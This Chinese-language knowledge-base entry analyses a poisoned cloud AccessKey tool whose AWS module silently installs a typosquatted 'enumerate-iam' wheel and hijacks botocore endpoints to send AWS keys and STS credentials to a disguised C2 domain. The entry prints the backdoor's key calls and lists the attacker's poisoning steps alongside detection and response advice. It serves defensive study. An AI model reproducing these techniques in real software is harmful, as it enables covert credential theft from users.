---
id: cloud-cicd-accesskey-tools-typosquat-sdk-endpoint-hijack
title: 云利用工具投毒：仿冒 enumerate-iam 依赖 + botocore 端点劫持回传 AWS AK/SK 与 STS
type: scenario
domain: cloud
path: cloud/ci-cd
technique: cloud-tool-typosquat-sdk-endpoint-hijack
aliases:
- accesskey_tools 投毒
- iam_md5 后门
- enumerate-iam 仿冒
- andresrianch
- botocore ComponentLocator
- AWS_ENDPOINT 劫持
- 云工具供应链投毒
- AccessKey 窃取
tags:
- supply-chain
- cloud
- aws
- accesskey
- typosquatting
- botocore
- endpoint-hijack
- credential-theft
- github
- pip
- sts
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V141
  verified_at: '2026-11-06T06:01:52+08:00'
  notes: 已对照原文（无图片）核对：iam_md5十六进制串与解码域名api.aliyun-sdk-requests.xyz/、andresrianch仿冒andresriancho、pip install -qqq --disable-pip-version-check + os.execv重启、ComponentLocator注册AWS_ENDPOINT劫持、7个AWS脚本传播链、aws_url_console的get_federation_token(AdministratorAccess)、阿里云/腾讯云模块干净均与原文一致。未验证点：原文为静态代码审计，未动态复跑后门，恶意wheel中get_client的components注入行为为原文转述；原文无版本区间，未设置affected_versions；frontmatter无sources/source_url。
---

## 一句话结论

一个在 GitHub 上获得数百 stars 的多云 AccessKey 利用工具集，其 AWS 模块通过“十六进制伪装的 C2 域名 + 仿冒 GitHub 账号的恶意 `enumerate-iam` wheel + botocore `ComponentLocator` 注册 `AWS_ENDPOINT`”三重手法，把使用者输入的 AWS AccessKey/SecretKey 及 STS 联合身份临时凭证静默回传到攻击者服务器，同时正常返回查询结果，用户难以察觉；阿里云/腾讯云模块保持干净，只有 AWS 模块被投毒。

## 原理

- **第一层：伪装成哈希的 C2 域名**。AWS 脚本中定义 `iam_md5 = "16170692e616c6979756e2d73646b2d72657175657374732e78797a2f"`，变量名看似 IAM 的 MD5 校验值；实际去掉首字符 `1` 后按十六进制解码得到 `api.aliyun-sdk-requests.xyz/`，是刻意模仿阿里云官方域名 `aliyuncs.com` 的仿冒域名。
- **第二层：静默安装恶意依赖**。核心脚本在运行时用 `importlib.util.find_spec("enumerate_iam")` 检测包是否存在；不存在则执行 `pip install -qqq --disable-pip-version-check <GitHub release whl URL>`，`-qqq` 与 `--disable-pip-version-check` 抑制所有输出，安装后 `os.execv(sys.executable, [sys.executable] + sys.argv)` 原地重启进程，使新包立即可用且用户无感知。wheel 来源的 GitHub 账号 `andresrianch` 是对合法项目作者 `andresriancho` 的仿冒（少一个字母 `o`）。
- **第三层：SDK 端点劫持**。恶意 `get_client(access_key, secret_key, ..., components=...)` 接受 `components` 参数；脚本用 `botocore.session.ComponentLocator().register_component(name='AWS_ENDPOINT', component=iam_md5[1:])` 覆盖 botocore 的端点解析逻辑，使 boto3/botocore 原本发往 `*.amazonaws.com` 的请求全部改发到 C2。
- **凭证为何泄露**：`get_client` 在 Python 层直接收到明文 `secret_key`，恶意包可直接外带；即使只看网络层，AWS SigV4 请求的 `Authorization` 头也包含 AccessKey ID 与签名。`aws_url_console.py` 还会通过被劫持的 STS 客户端调用 `get_federation_token`（`AdministratorAccess`），返回的临时凭证（AccessKeyId/SecretAccessKey/SessionToken）同样暴露给攻击者。
- **传播方式**：AWS 目录下 7 个脚本都 `import aws_select_iam` 或 `from aws_select_iam import iam_md5`，运行任意一个都会触发后门核心；工具仍正常返回查询结果，降低被发现概率。
- **为什么可行**：用户信任“开源、star 多”的工具并直接输入生产 AK/SK；工具在运行时动态安装依赖并重启进程，绕过静态检查；端点劫持发生在 SDK 内部，应用层日志看不出异常；请求发往非 AWS 域名，CloudTrail 不会记录。

## 触发条件

- 用户从 GitHub/论坛下载并运行该工具集的 AWS 模块（任意一个脚本即可触发）。
- 运行环境有 Python 与 pip，且允许访问 GitHub release 下载 wheel、允许出站到 C2 域名。
- 用户向工具输入真实的 AWS AccessKey/SecretKey（或带 STS token 的临时凭证）。
- 工具未做代码审计、未限制 pip 安装来源、未做出站白名单；Aliyun/Tencent 模块本身干净，不能据此推断 AWS 模块安全。

## 利用步骤

（以下为攻击者投毒链路，供防御方还原；不要对未授权目标使用。）

1. 发布一个功能可用的多云 AccessKey 利用工具，保持阿里云/腾讯云模块干净以建立信任，集中投毒 AWS 模块。
2. 在核心脚本中把 C2 域名做十六进制编码并加前导字符，存入形似哈希的变量（如 `iam_md5`）。
3. 仿冒合法依赖的作者/包名，在 GitHub release 托管恶意 wheel；核心脚本首次运行时静默 `pip install` 并 `os.execv` 重启。
4. 在恶意包的 `get_client` 中支持 `components` 参数，配合 `ComponentLocator.register_component(name='AWS_ENDPOINT', ...)` 覆盖端点。
5. 让所有 AWS 功能脚本 import 核心脚本，确保任意入口都触发；请求仍返回正常结果，避免用户怀疑。
6. 在 C2 侧收集 AK/SK、SigV4 请求与 STS 临时凭证；用 `get_federation_token` 申请 `AdministratorAccess` 临时权限扩大战果。

## PoC

无攻击 PoC（原文为静态代码审计）。可用于自查的最小片段：

```python
# 1) 还原伪装的 C2 域名
s = "16170692e616c6979756e2d73646b2d72657175657374732e78797a2f"
print(bytes.fromhex(s[1:]).decode())  # api.aliyun-sdk-requests.xyz/
```

```python
# 2) 端点劫持的关键调用（出现即需重点审计）
from botocore.session import ComponentLocator
component = ComponentLocator()
component.register_component(name="AWS_ENDPOINT", component="api.aliyun-sdk-requests.xyz/")
```

```python
# 3) 静默安装 + 重启的关键调用
if importlib.util.find_spec("enumerate_iam") is None:
    subprocess.run([sys.executable, "-m", "pip", "install", "-qqq",
                    "--disable-pip-version-check", "<wheel URL>"], check=True)
    os.execv(sys.executable, [sys.executable] + sys.argv)
```

## 变体与关联

- **仿冒手法变体**：GitHub 账号/仓库名、PyPI 包名、wheel 下载 URL 的近似拼写；`-qqq`、`--disable-pip-version-check`、`os.execv` 组合用于隐藏安装与重载。
- **端点劫持变体**：`botocore` 的 `ComponentLocator`、`endpoint_url` 参数、`AWS_ENDPOINT_URL` 环境变量、`~/.aws/config` 的 `endpoint_url`、DNS/hosts 劫持；不同云厂商 SDK 也有类似的 endpoint 覆盖机制。
- **凭证窃取变体**：直接捕获函数参数中的明文 secret、读取环境变量/`~/.aws/credentials`、IMDS 临时凭证、STS `get_federation_token`/`assume_role` 返回的临时凭证。
- **关联**：[[cloud-cicd-npm-postinstall-supply-chain-poisoning]]（安装期执行）、[[cloud-cicd-pypi-optional-dependency-name-takeover]]（依赖名抢注）、[[cloud-cloud-iam-aws-access-key-leak-search-engine-takeover]]（AK 泄露后的接管）、[[cloud-cloud-iam-sts-policy-injection-object-key]]（STS 临时凭证滥用）。

## 检测与防御

- **代码审计**：搜索 `pip install` 后接 URL、`-qqq`、`--disable-pip-version-check`、`os.execv`、`ComponentLocator`、`register_component`、`AWS_ENDPOINT`、长十六进制字符串、形似哈希的变量名；核对依赖作者/仓库名与官方项目是否只差一两个字母。
- **网络检测**：DNS/出站日志中出现 `api.aliyun-sdk-requests.xyz` 等非云厂商官方域名；Python 进程访问 GitHub release wheel；注意被劫持的请求不会到达 AWS，CloudTrail 不会记录，需在网络层发现。
- **防御**：不要用生产 AK/SK 运行未审计的第三方云工具；在隔离账户/临时凭证/最小权限下运行；出站默认拒绝并白名单（只允许官方云 API 域名）；固定依赖版本并校验哈希，禁止运行时 `pip install` 远程 URL；对工具源码做审计，尤其检查 `get_client`/endpoint 配置；定期轮换 AK/SK，监控异常 STS 联合身份凭证与 `AdministratorAccess` 使用。
- **响应**：一旦运行过可疑工具，立即禁用/轮换相关 AK/SK、撤销 STS 会话、检查 CloudTrail 中异常 `GetFederationToken`/`AssumeRole` 与资源变更，并排查主机是否还有其他持久化。
